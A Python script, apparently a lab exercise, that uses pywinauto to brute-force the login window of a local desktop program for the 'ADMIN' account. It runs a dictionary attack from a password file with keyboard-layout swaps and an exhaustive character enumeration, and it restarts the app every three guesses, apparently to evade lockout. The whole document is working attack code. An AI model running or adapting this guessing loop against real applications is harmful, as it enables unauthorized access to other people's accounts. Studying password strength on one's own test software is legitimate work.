import time
import os
from pywinauto import Application, findwindows

def сменаРаскладки(text):
    eng = "qwertyuiop[]asdfghjkl;'zxcvbnm,.`"
    ru = "йцукенгшщзхъфывапролджэячсмитьбюё"
    result = []
    for char in text:
        if char in eng:
            i = eng.index(char)
            result.append(ru[i])
        elif char in ru:
            i = ru.index(char)
            result.append(eng[i])
        else:
            result.append(char)
    return ''.join(result)

def start_app():
    app_path = os.path.abspath("main.py")
    try:
        app = Application(backend="uia").start(f'pythonw "{app_path}"', wait_for_idle=False)
        for _ in range(20):
            try:
                window = app.window(title="Верификация")
                if window.exists(timeout=0.5):
                    return app, window
            except:
                pass
            time.sleep(0.1)
    except Exception as e:
        print(f"Ошибка при запуске приложения: {e}")
    raise Exception("Окно 'Верификация' не появилось")

def writeLogin(window, login):
    edit_controls = window.descendants(control_type="Edit")
    if len(edit_controls) < 2:
        raise Exception("Не удалось найти поля ввода")
    login_input = edit_controls[0]
    login_input.set_focus()
    login_input.set_edit_text(login)

def inputPassword(window, password):
    edit_controls = window.descendants(control_type="Edit")
    if len(edit_controls) < 2:
        raise Exception("Не удалось найти поля ввода")

    password_input = edit_controls[1]
    password_input.set_focus()
    password_input.set_edit_text(password)

    buttons = window.descendants(control_type="Button")
    for btn in buttons:
        btn_text = btn.window_text()
        if "Войти" in btn_text or "Неверный логин/пароль" in btn_text:
            btn.click()
            time.sleep(0.1)
            return

    raise Exception("Кнопка входа не найдена")

def is_window_open(window_title):
    try:
        handles = findwindows.find_windows(title_re=fr".*{window_title}.*")
        return len(handles) > 0
    except:
        return False

def bruteByBook(login):
    start_time = time.time()
    attempts = 0

    with open("Пароли.txt", 'r', encoding="UTF-8") as file:
        passwords = [line.strip() for line in file if line.strip()]

    extended_passwords = []
    for p in passwords:
        extended_passwords.append(p)
        if not p.isdigit():
            extended_passwords.append(сменаРаскладки(p))

    for i in range(0, len(extended_passwords), 3):
        group = extended_passwords[i:i + 3]
        attempts += len(group)

        try:
            app, window = start_app()
            writeLogin(window, login)

            success_password = None
            for password in group:
                inputPassword(window, password)
                time.sleep(0.03)

                if is_window_open("Успех"):
                    success_password = password
                    break

            if success_password:
                elapsed = time.time() - start_time
                print(f"УСПЕШНЫЙ ВХОД! Логин: {login}, Пароль: {success_password}")
                return True, attempts, elapsed

            app.kill()
        except Exception as e:
            print(f"Ошибка при попытке входа: {e}")
            continue

    elapsed = time.time() - start_time
    print("Все пароли перебраны, вход не удался")
    return False, attempts, elapsed


def bruteForce(login, maxLen):
    start_time = time.time()
    attempts = 0
    lower = 'abcdefghijklmnopqrstuvwxyz'
    upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    numbers = '0123456789'
    specials = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`\'"\\'
    alphabet = lower + upper + numbers + specials

    # Генератор паролей
    def password_generator():
        for length in range(1, maxLen + 1):
            indexes = [0] * length
            while True:
                yield ''.join([alphabet[i] for i in indexes])

                # Обновляем индексы для следующего пароля
                i = length - 1
                while i >= 0:
                    if indexes[i] < len(alphabet) - 1:
                        indexes[i] += 1
                        break
                    else:
                        indexes[i] = 0
                        i -= 1
                else:
                    break

    gen = password_generator()
    while True:
        group = []
        for _ in range(3):
            try:
                group.append(next(gen))
            except StopIteration:
                break

        if not group:
            break

        try:
            app, window = start_app()
            writeLogin(window, login)

            success_password = None
            for password in group:
                attempts+=1
                inputPassword(window, password)
                time.sleep(0.02)

                if is_window_open("Успех"):
                    success_password = password
                    break

            if success_password:
                elapsed = time.time() - start_time
                print(f"УСПЕШНЫЙ ВХОД! Логин: {login}, Пароль: {success_password}")
                return True, attempts, elapsed

            app.kill()

        except Exception as e:
            print(f"Ошибка: {e}")
            continue

    elapsed = time.time() - start_time
    print("Все комбинации перебраны, вход не удался")
    return False, attempts, elapsed

if __name__ == "__main__":
    login = "ADMIN"

    success, attempts, elapsed = bruteByBook(login)
    # success, attempts, elapsed = bruteForce(login, maxLen=4)

    if success:
        print(f"Попыток: {attempts}, Время: {elapsed:.2f} сек, Скорость перебора {attempts/elapsed:.2f} сек")
    else:
        print(f"Попыток: {attempts}, Время: {elapsed:.2f} сек, Скорость перебора {attempts/elapsed:.2f} сек")